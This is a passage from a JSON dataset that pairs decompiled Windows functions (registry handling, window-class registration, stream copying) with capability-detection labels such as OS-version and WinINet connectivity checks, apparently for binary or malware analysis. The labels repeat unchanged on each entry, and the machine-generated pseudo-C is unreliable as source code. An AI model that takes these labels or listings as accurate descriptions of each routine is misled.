        "decompiled_code": "\nvoid fcn.0041fc84(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x10) == 0) {\n        fcn.0041959c();\n    }\n    fcn.00419610();\n    return;\n}\n",
        "token_count": 61
    },
    "0041fd14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fd14(char param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 == '\\0') {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) & 0xffef;\n    }\n    else {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 0x10;\n    }\n    if ((param_1 != '\\0') && (iVar1 = fcn.0041fcb0(),  -1 < iVar1 + -1)) {\n        do {\n            fcn.0041fc84();\n            fcn.0041fd14();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "0041fe1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041fe1c(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        cVar1 = fcn.004046f4();\n        if (cVar1 == '\\0') {\n            uVar2 = 0x80004002;\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = (****(arg_8h + 0x20))(*(arg_8h + 0x20), arg_ch, arg_10h);\n    }\n    return uVar2;\n}\n",
        "token_count": 164
    },
    "0041ffd8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041ffd8(void)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    \n    iVar1 = fcn.00404a0c();\n    fcn.0041f6bc();\n    if (*(iVar1 + 0x30) != 0) {\n        fcn.0041f984();\n    }\n    if (*(iVar1 + 0x50) != 0) {\n        while (0 < *(*(iVar1 + 0x50) + 8)) {\n            fcn.004196f8();\n            fcn.00420120();\n        }\n    }\n    fcn.0040f840();\n    if ('\\0' < extraout_DL) {\n        fcn.004049b4();\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "0042006c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042006c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x42) != 0) {\n        (**(in_EAX + 0x40))();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 64
    },
    "00420088": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00420088(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x4a) != 0) {\n        (**(in_EAX + 0x48))();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 64
    },
    "00420210": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420210(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x42025f;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch == 0) {\n        uVar1 = 0x80030009;\n        *in_FS_OFFSET = uStack28;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0xc) + 0xc))();\n        if (arg_14h != NULL) {\n            *arg_14h = uVar1;\n        }\n        uVar1 = 0;\n        *in_FS_OFFSET = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 226
    },
    "00420278": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420278(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x4202c7;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch == 0) {\n        uVar1 = 0x80030009;\n        *in_FS_OFFSET = uStack28;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0xc) + 0x10))();\n        if (arg_14h != NULL) {\n            *arg_14h = uVar1;\n        }\n        uVar1 = 0;\n        *in_FS_OFFSET = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 228
    },
    "004203c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004203c8(int32_t arg_8h, int32_t *arg_ch, uint32_t arg_10h, int32_t arg_14h, uint32_t *arg_18h, uint32_t *arg_1ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    puStack60 = 0x4203d9;\n    fcn.00406fb0();\n    uStack64 = 0x4205bb;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_4h = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    uStack76 = 0x420594;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    if (arg_14h == 0) {\n        if (arg_10h < 0x100001) {\ncode_r0x00420432:\n            var_ch = arg_10h;\n            goto code_r0x00420438;\n        }\n    }\n    else if (arg_14h < 1) goto code_r0x00420432;\n    var_ch = 0x100000;\ncode_r0x00420438:\n    puStack84 = 0x420440;\n    puStack60 = &stack0xfffffffc;\n    var_8h = fcn.00402ef0();\n    uStack88 = 0x420583;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    do {\n        if (arg_14h == 0) {\n            if (arg_10h == 0) {\ncode_r0x00420543:\n                *in_FS_OFFSET = uStack92;\n                puStack84 = 0x42058a;\n                uStack88 = 0x420558;\n                fcn.00402f0c();\n                if (arg_1ch != NULL) {\n                    *arg_1ch = var_20h;\n                    arg_1ch[1] = var_1ch;\n                }\n                if (arg_18h != NULL) {\n                    *arg_18h = var_18h;\n                    arg_18h[1] = var_14h;\n                }\n                return;\n            }\n        }\n        else if (arg_14h < 1) goto code_r0x00420543;\n        uVar1 = arg_10h;\n        if (arg_14h == 0) {\n            if (0x7fffffff < arg_10h) {\ncode_r0x00420469:\n                uVar1 = 0x7fffffff;\n            }\n        }\n        else if (0 < arg_14h) goto code_r0x00420469;\n        for (; 0 < uVar1; uVar1 = uVar1 - uVar2) {\n            var_10h = uVar1;\n            if (var_ch < uVar1) {\n                var_10h = var_ch;\n            }\n            uVar2 = (**(**(arg_8h + 0xc) + 0xc))();\n            if (uVar2 == 0) {\n                fcn.00404f60();\n                *in_FS_OFFSET = uStack92;\ncode_r0x004205a5:\n                *in_FS_OFFSET = uStack80;\n                puStack72 = 0x4205c2;\n                uStack76 = 0x4205ba;\n                fcn.00406f3c();\n                return;\n            }\n            bVar3 = CARRY4(var_18h, uVar2);\n            var_18h = var_18h + uVar2;\n            var_14h = var_14h + (uVar2 >> 0x1f) + bVar3;\n            var_28h = 0;\n            var_24h = 0;\n            var_4h = (**(*arg_ch + 0x10))(arg_ch, var_8h, uVar2, &fcn.004203c8::var_28h);\n            bVar3 = CARRY4(var_20h, var_28h);\n            var_20h = var_20h + var_28h;\n            var_1ch = var_1ch + var_24h + bVar3;\n            if ((var_4h == 0) && (uVar2 != var_28h)) {\n                var_4h = -0x7fffbffb;\n            }\n            if (var_4h != 0) {\n                fcn.00404f60();\n                *in_FS_OFFSET = uStack92;\n                goto code_r0x004205a5;\n            }\n            bVar3 = arg_10h < uVar2;\n            arg_10h = arg_10h - uVar2;\n            arg_14h = (arg_14h - (uVar2 >> 0x1f)) - bVar3;\n        }\n    } while( true );\n}\n",
        "token_count": 1309
    },
    "00420730": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00420730(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    puVar1 = *0x4aa9e8;\n    if (*0x4aa9ec == NULL) {\n        puVar1 = sub.kernel32.dll_VirtualAlloc_1(0, 0x1000, 0x1000, 0x40);\n        *puVar1 = *0x4aa9e8;\n        fcn.004030ec();\n        uVar2 = fcn.00420728();\n        *(puVar1 + 6) = uVar2;\n        puVar3 = puVar1 + 10;\n        do {\n            puVar4 = puVar3;\n            *puVar4 = 0xe8;\n            uVar2 = fcn.00420728();\n            *(puVar4 + 1) = uVar2;\n            *(puVar4 + 5) = *0x4aa9ec;\n            puVar3 = puVar4 + 0xd;\n            *0x4aa9ec = puVar4;\n        } while ((puVar4 + 0xd) - puVar1 < 0xffc);\n    }\n    *0x4aa9e8 = puVar1;\n    puVar3 = *0x4aa9ec;\n    puVar1 = *0x4aa9ec + 5;\n    *0x4aa9ec = *(*0x4aa9ec + 5);\n    *puVar1 = arg_8h;\n    *(puVar3 + 9) = arg_ch;\n    return puVar3;\n}\n",
        "token_count": 383
    },
    "004207ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004207ec(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint lpWndClass;\n    code *var_24h;\n    \n    *0x4a1b3c = *0x4a87f8;\n    iVar1 = sub.user32.dll_GetClassInfoA(*0x4a87f8, *0x4a1b50, &lpWndClass);\n    if ((iVar1 == 0) || (var_24h != sub.user32.dll_DefWindowProcA)) {\n        if (iVar1 != 0) {\n            sub.user32.dll_UnregisterClassA(*0x4a1b50, *0x4a87f8);\n        }\n        sub.user32.dll_RegisterClassA(0x4a1b2c);\n    }\n    uVar2 = fcn.0040847c(0, *0x4a87f8, 0, 0, 0, 0, 0, 0, 0x80000000);\n    if (arg_8h._2_2_ != 0) {\n        uVar3 = fcn.00420730(arg_8h, arg_ch);\n        sub.user32.dll_SetWindowLongA(uVar2, 0xfffffffc, uVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 311
    },
    "00420be4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00420be4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) != 0) {\n        if (*(in_EAX + 0xc) == '\\0') {\n            sub.advapi32.dll_RegFlushKey(*(in_EAX + 4));\n        }\n        sub.advapi32.dll_RegCloseKey_1(*(in_EAX + 4));\n        *(in_EAX + 4) = 0;\n        fcn.0040546c();\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "00420c14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420c14(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 8)) {\n        if (*(in_EAX + 0x14) != '\\0') {\n            sub.advapi32.dll_RegCloseKey_1(*(in_EAX + 8));\n            *(in_EAX + 0x14) = 0;\n        }\n        *(in_EAX + 8) = param_2;\n        fcn.00420be4();\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00420d58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00420d58(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uchar var_6h;\n    char var_5h;\n    int32_t var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack36 = 0x420e5d;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    fcn.00405504();\n    uVar1 = fcn.00420acc();\n    if (uVar1 == 0) {\n        fcn.004059a4();\n    }\n    var_ch = 0;\n    if ((var_5h == '\\0') || (var_4h == 0)) {\n        uVar2 = fcn.004058fc(0, *(in_EAX + 0x18), &var_ch);\n        uVar2 = fcn.00420c64(uVar2);\n        iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n    }\n    else {\n        uVar2 = fcn.004058fc(0, 0, 0, *(in_EAX + 0x18), 0, &var_ch, &var_10h);\n        uStack76 = fcn.00420c64(uVar2);\n        iVar3 = sub.advapi32.dll_RegCreateKeyExA();\n    }\n    var_6h = iVar3 == 0;\n    if (var_6h) {\n        if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n            fcn.00405800(var_4h, 0x420e78, *(in_EAX + 0x10));\n        }\n        fcn.00420c40();\n    }\n    *in_FS_OFFSET = uStack76;\n    fcn.0040546c(0x420e64);\n    return;\n}\n",
        "token_count": 495
    },
    "00420e7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00420e7c(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff90;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack36 = 0x42102d;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    fcn.00405504();\n    uVar1 = fcn.00420acc();\n    if (uVar1 == 0) {\n        fcn.004059a4();\n    }\n    var_ch = 0;\n    uVar4 = *(in_EAX + 0x18) & 0x300;\n    uVar2 = fcn.004058fc(0, uVar4 | 0x20019, &var_ch);\n    uVar2 = fcn.00420c64(uVar2);\n    iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n    var_5h = iVar3 == 0;\n    if (var_5h) {\n        *(in_EAX + 0x18) = uVar4 | 0x20019;\n        if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n            fcn.00405800(var_4h, 0x421048, *(in_EAX + 0x10));\n        }\n        fcn.00420c40();\n    }\n    else {\n        uVar2 = fcn.004058fc(0, uVar4 | 0x20009, &var_ch);\n        uVar2 = fcn.00420c64(uVar2);\n        iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n        var_5h = iVar3 == 0;\n        if (var_5h) {\n            *(in_EAX + 0x18) = uVar4 | 0x20009;\n            if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n                fcn.00405800(var_4h, 0x421048, *(in_EAX + 0x10));\n            }\n            fcn.00420c40();\n        }\n        else {\n            uVar2 = fcn.004058fc(0, uVar4 | 1, &var_ch);\n            uVar2 = fcn.00420c64(uVar2);\n            iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n            var_5h = iVar3 == 0;\n            if (var_5h) {\n                *(in_EAX + 0x18) = uVar4 | 1;\n                if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n                    in_stack_ffffff90 = var_4h;\n                    fcn.00405800(var_4h, 0x421048, *(in_EAX + 0x10));\n                }\n                fcn.00420c40();\n            }\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffff90;\n    fcn.0040546c(0x421034);\n    return;\n}\n",
        "token_count": 789
    },
    "0042104c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0042104c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack92;\n    int32_t iStack88;\n    uchar *puStack84;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint hKey;\n    uint var_18h;\n    int32_t var_11h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack76 = 0x4211b6;\n    iStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack84 = 0x42107b;\n    fcn.00405504();\n    puStack84 = 0x421083;\n    var_11h._0_1_ = fcn.00420acc();\n    if (var_11h == '\\0') {\n        puStack84 = 0x42109e;\n        fcn.004059a4();\n    }\n    puStack84 = 0x4210b1;\n    iVar2 = fcn.004216e8();\n    if (iVar2 != 0) {\n        iStack88 = 0x42116c;\n        iStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        puStack84 = &stack0xfffffffc;\n        fcn.00420c78();\n        cVar1 = fcn.004211e4();\n        if (cVar1 != '\\0') {\n            fcn.0040555c();\n            iVar4 = var_38h + -1;\n            if (-1 < iVar4) {\n                do {\n                    *NULL = var_34h + 1;\n                    fcn.004058fc(&fcn.0042104c::var_11h + 1, 0, 0, 0, 0);\n                    iStack92 = iVar2;\n                    iVar3 = sub.advapi32.dll_RegEnumKeyExA();\n                    if (iVar3 == 0) {\n                        fcn.004058fc();\n                        fcn.00405664();\n                        fcn.0042104c();\n                    }\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != -1);\n            }\n        }\n        *in_FS_OFFSET = iStack92;\n        puStack84 = 0x421173;\n        iStack88 = 0x421162;\n        fcn.00420c78();\n        iStack92 = 0x42116b;\n        iStack88 = iVar2;\n        sub.advapi32.dll_RegCloseKey_1();\n        return;\n    }\n    puStack84 = 0x42117b;\n    puStack84 = fcn.004058fc();\n    iStack88 = 0x421188;\n    iStack88 = fcn.00420c64();\n    iStack92 = 0x42118e;\n    sub.advapi32.dll_RegDeleteKeyA();\n    *in_FS_OFFSET = iStack88;\n    iStack80 = 0x4211bd;\n    puStack84 = 0x4211a8;\n    fcn.0040546c();\n    puStack84 = 0x4211b5;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 813
    },
    "004211e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004211e4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    fcn.00403ae4();\n    uVar1 = sub.advapi32.dll_RegQueryInfoKeyA\n                      (*(in_EAX + 4), 0, 0, 0, param_2, param_2 + 4, 0, param_2 + 8, param_2 + 0xc, param_2 + 0x10, 0, \n                       param_2 + 0x14);\n    if ((*(*0x4a5178 + 0xc) != '\\0') && (**0x4a5164 == 2)) {\n        *(param_2 + 4) = *(param_2 + 4) + *(param_2 + 4);\n        *(param_2 + 0xc) = *(param_2 + 0xc) + *(param_2 + 0xc);\n    }\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 248
    },
    "00421598": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00421598(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint var_10h;\n    int32_t var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    cVar1 = fcn.004213dc();\n    if (cVar1 == '\\0') {\n        var_ch = 0;\n    }\n    else if (((var_10h == '\\x04') || (var_10h == '\\0')) && (var_ch <= arg_8h)) {\n        fcn.00421664(&var_5h, var_ch);\n    }\n    else {\n        fcn.00420aa0();\n    }\n    return var_ch;\n}\n",
        "token_count": 170
    },
    "00421a40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421a40(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack176;\n    uint uStack172;\n    uchar *puStack168;\n    uint uStack164;\n    uint uStack160;\n    uchar *puStack156;\n    uint uStack152;\n    uint uStack148;\n    uchar *puStack144;\n    int32_t iStack136;\n    uint uStack132;\n    uint *puStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint uStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t dwIndex;\n    int32_t var_10h;\n    uint var_ch;\n    uint hKey;\n    uint var_4h;\n    \n    puStack88 = &stack0xfffffffc;\n    var_50h = 0;\n    var_4ch = 0;\n    var_48h = 0;\n    var_4h = 0;\n    uStack92 = 0x421c81;\n    uStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    var_18h = *(*(arg_8h + -4) + 4);\n    puStack100 = 0x421a82;\n    hKey = in_EAX;\n    fcn.00420c78();\n    uStack104 = 0x421c57;\n    uStack108 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    uStack112 = 0x421a9e;\n    puStack100 = &stack0xfffffffc;\n    cVar1 = fcn.004211e4();\n    if (cVar1 != '\\0') {\n        uStack112 = 0x421ab4;\n        fcn.0040555c();\n        if (-1 < var_44h + -1) {\n            var_28h = var_44h;\n            dwIndex = 0;\n            do {\n                var_10h = var_40h + 1;\n                uStack112 = 0;\n                uStack116 = 0;\n                uStack120 = 0;\n                uStack124 = 0;\n                puStack128 = &fcn.00421a40::var_10h;\n                uStack132 = 0x421ae6;\n                uStack132 = fcn.004058fc();\n                iStack136 = dwIndex;\n                uStack108 = hKey;\n                puStack144 = 0x421af4;\n                iVar2 = sub.advapi32.dll_RegEnumKeyExA();\n                if (iVar2 == 0) {\n                    puStack144 = 0x421b04;\n                    fcn.004058fc();\n                    puStack144 = 0x421b0e;\n                    fcn.00405664();\n                    puStack144 = 0x421b1c;\n                    var_20h = fcn.004216e8();\n                    if (var_20h != 0) {\n                        uStack148 = 0x421c28;\n                        uStack152 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff68;\n                        var_1ch = *(*(arg_8h + -4) + 4);\n                        puStack156 = 0x421b51;\n                        puStack144 = &stack0xfffffffc;\n                        fcn.00420c78();\n                        uStack160 = 0x421c0a;\n                        uStack164 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff5c;\n                        puStack168 = 0x421b67;\n                        puStack156 = &stack0xfffffffc;\n                        fcn.004058fc();\n                        puStack168 = 0x421b71;\n                        fcn.00405664();\n                        puStack168 = 0x421b7f;\n                        fcn.00420c7c();\n                        puStack168 = 0x421b87;\n                        fcn.004058fc();\n                        puStack168 = 0x421b91;\n                        fcn.00405664();\n                        puStack168 = 0x421b9f;\n                        var_24h = fcn.004216e8();\n                        uStack172 = 0x421be7;\n                        uStack176 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff50;\n                        puStack168 = &stack0xfffffffc;\n                        fcn.00421918(arg_8h);\n                        fcn.00421a40(arg_8h);\n                        *in_FS_OFFSET = uStack176;\n                        puStack168 = 0x421bee;\n                        uStack172 = var_24h;\n                        uStack176 = 0x421be6;\n                        sub.advapi32.dll_RegCloseKey_1();\n                        return;\n                    }\n                }\n                dwIndex = dwIndex + 1;\n                var_28h = var_28h + -1;\n            } while (var_28h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack108;\n    puStack100 = 0x421c5e;\n    uStack104 = 0x421c56;\n    fcn.00420c78();\n    return;\n}\n",
        "token_count": 1271
    },
    "00421c8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421c8c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    int32_t iStack44;\n    uchar *puStack40;\n    uint uStack36;\n    int32_t iStack32;\n    uchar *puStack28;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x421ca5;\n    cVar1 = fcn.00421780();\n    if (cVar1 != '\\0') {\n        puStack28 = 0x421cb7;\n        cVar1 = fcn.00421780();\n        if (cVar1 == '\\0') {\n            puStack28 = 0x421cc9;\n            iVar2 = fcn.004216e8();\n            if (iVar2 != 0) {\n                iStack32 = 0x421d6e;\n                uStack36 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffdc;\n                puStack40 = 0x421cee;\n                puStack28 = &stack0xfffffffc;\n                fcn.00420c7c();\n                puStack40 = 0x421cf8;\n                iVar3 = fcn.004216e8();\n                if (iVar3 != 0) {\n                    iStack44 = 0x421d50;\n                    uStack48 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffffd0;\n                    puStack40 = &stack0xfffffffc;\n                    fcn.00421918(&stack0xfffffffc);\n                    fcn.00421a40(&stack0xfffffffc);\n                    if (arg_8h != '\\0') {\n                        fcn.0042104c();\n                    }\n                    *in_FS_OFFSET = uStack48;\n                    puStack40 = 0x421d57;\n                    